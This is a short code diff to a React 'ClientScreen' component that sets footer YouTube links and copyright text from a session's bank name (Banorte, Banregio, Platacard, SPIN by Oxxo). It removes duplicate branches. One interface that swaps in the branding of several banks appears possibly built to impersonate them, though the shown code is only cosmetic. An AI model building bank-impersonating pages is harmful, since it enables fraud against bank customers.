@@ -875,7 +875,6 @@ export default function ClientScreen() {
                 sessionData.banco === 'PLATACARD' ? 'https://youtube.com/@platacardoficial?si=OdZlV-hKxx1W2YIg' :
                 sessionData.banco === 'BANREGIO' ? 'https://www.youtube.com/channel/UC0UWRvXksJJzXG-hRnGDG3g' :
                 sessionData.banco === 'SPIN' ? 'https://www.youtube.com/channel/UC6LuKC5QzmY2V4qVbJYJavw' :
-                sessionData.banco === 'PLATACARD' ? 'https://www.youtube.com/channel/platacard' :
                 'https://www.youtube.com/user/GFBanorte'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Youtube</a>
             </div>
@@ -891,7 +890,6 @@ export default function ClientScreen() {
               sessionData.banco === 'PLATACARD' ? 'PLATACARD' :
               sessionData.banco === 'BANREGIO' ? 'Banregio' :
               sessionData.banco === 'SPIN' ? 'SPIN by Oxxo' :
-              sessionData.banco === 'PLATACARD' ? 'Plata Card' :
               'Banorte'
             } México 2025. Todos los Derechos Reservados</div>
           </div>
